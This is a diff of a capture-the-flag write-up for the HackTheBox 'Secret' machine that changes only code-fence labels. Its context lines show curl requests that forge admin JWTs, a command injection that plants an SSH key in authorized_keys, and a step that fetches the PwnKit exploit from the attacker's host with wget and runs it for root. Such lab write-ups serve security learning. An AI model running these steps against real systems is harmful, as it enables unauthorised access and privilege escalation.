@@ -114,7 +114,7 @@ _Can you keep a secret?_
 ## 5. Plan 1 (from outer spaaaaaace!)
 - Attempted user replacement
 	- Attempt
-	```
+	```shell_session
 	curl -i -X POST \
 	  -H 'Content-Type: application/json' \
 	  -d '{"name":" theadmin", "email":"drt@dasith.works", "password":"testpassword"}' \
@@ -122,7 +122,7 @@ _Can you keep a secret?_
 	```
 	- Success! (but not really)
 
-		```
+		```shell_session
 		HTTP/1.1 200 OK
 		Server: nginx/1.18.0 (Ubuntu)
 		Date: Tue, 15 Mar 2022 01:59:53 GMT
@@ -136,7 +136,7 @@ _Can you keep a secret?_
 		```
 
 	- The user was created but it is ` theadmin` and not `theadmin` (notice the leading space). However, they both use the same email address.
-	```
+	```shell_session
 	curl -i -X POST \
     -H 'Content-Type: application/json' \
     -d '{"email":"drt@dasith.works", "password":"testpassword"}' \
@@ -144,7 +144,7 @@ _Can you keep a secret?_
 	```
 	- Successfully logged in with ` theadmin` email and got our JWT:
 
-		```
+		```shell_session
 		HTTP/1.1 200 OK
 		Server: nginx/1.18.0 (Ubuntu)
 		Date: Tue, 15 Mar 2022 02:04:48 GMT
@@ -165,7 +165,7 @@ _Can you keep a secret?_
 	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.ZoGUsmIsEESpXWqzWVczp-6ye-tLZzGQ_vciLwbsZjw
 	```
 - Lets test our token
-	```
+	```shell_session
 	curl -X POST http://10.10.11.120:3000/api/user/login
    -H "Authorization: Bearer {eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.ZoGUsmIsEESpXWqzWVczp-6ye-tLZzGQ_vciLwbsZjw}"
    -d ‘{“email”:”drt@dasiths.works”,”password”:”testpassword”}’
@@ -189,7 +189,7 @@ _Can you keep a secret?_
 - Digging into the source code, there's a hidden `.git` folder
 - Let's look at the git logs to see if anything changed
 
-	```
+	```shell_session
 	┌──(acousticgirl㉿kali)-[~/…/HTB/secret/local-web/.git]
 	└─$ git log                                         
 	commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
@@ -219,7 +219,7 @@ _Can you keep a secret?_
 	
 	- This line looks promising - `removed .env for security reasons` so lets look at that commit
 
-		```
+		```shell_session
 		┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
 		└─$ git log -p  -- .env    
 		commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
@@ -258,11 +258,11 @@ _Can you keep a secret?_
 		eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjJmZjMxOTlhNjA2ODA0NjM4OGRkMGQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczMDk4ODh9.U2kHzOJQZLIX8YzMvyx-Bsl4-7FLFDSfedr7vGXYh6U
 		```
 - Testing the new token
-	```
+	```shell_session
 	curl http://10.10.11.120:3000/api/priv   -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU"
 	```
  - **SUCCESS!**
-	```
+	```shell_session
 	┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret/local-web]
 	└─$ curl http://10.10.11.120:3000/api/priv   -H "auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjMwY2I0MDQyNGNmMDA0NWRmYmIyODAiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFjb3VzdGljZ2lybEBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDczNjQ5NDB9.bf79mgAuXL4tf05-Avv_Ami2WH-QlZFvr6WRtTng1kU"
 	{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}     
@@ -281,7 +281,7 @@ _Can you keep a secret?_
 
 ## 9. Gaining SSH
 - Generate a new ssh key for this challenge and label it secret.htb
-	```
+	```shell_session
 	ssh-keygen -t rsa -b 4096 -C 'acousticgirl@htb' -f secret.htb -P ''
 	```
 		- -C is the comment
@@ -293,7 +293,7 @@ _Can you keep a secret?_
 	`export PUBLIC_KEY=$(cat secret.htb.pub)`
 		- You **must** do this step
 - Craft a GET request that adds your `$PUBLIC_KEY` contents to /home/dasith/.ssh/authorized_keys on the target machine
-	```
+	```shell_session
 	┌──(acousticgirl㉿kali)-[~/CTF/HTB/secret]
 	└─$ curl \
 	> -i \
@@ -313,13 +313,13 @@ _Can you keep a secret?_
 	"ab3e953 Added the codes\n" 
 ```
 - Login with SSH
-	```
+	```shell_session
 	ssh -i secret.htb dasith@10.10.11.120
 	```
 
 
 ## 10. User Flag
-	```
+	```shell_session
 	cat user.txt
 	d##############################d
 	```
@@ -332,7 +332,7 @@ _Can you keep a secret?_
 - Try the `/opt/count` program
 	- It's like `wc` and can save to a file
 - Investigate /opt/
-	```
+	```shell_session
 	dasith@secret:/tmp$ ls -la /opt
 	total 56
 	drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
@@ -364,7 +364,7 @@ _Can you keep a secret?_
 
 ## 12. Root Flag
 - Navigate to `/root`
-	```
+	```shell_session
 	cat root.txt
 	a##############################8
 	```
@@ -377,7 +377,7 @@ _Can you keep a secret?_
 - In the directory that your PwnKit script is in, start an HTTP server with Python
 	`python3 -m http.server 80`
 - On victim machine, pull the script down, chmod it to be executable, and run it
-	```
+	```shell_session
 	wget <your ip>/PwnKit
 	chmod +x PwnKit
 	./PwnKit
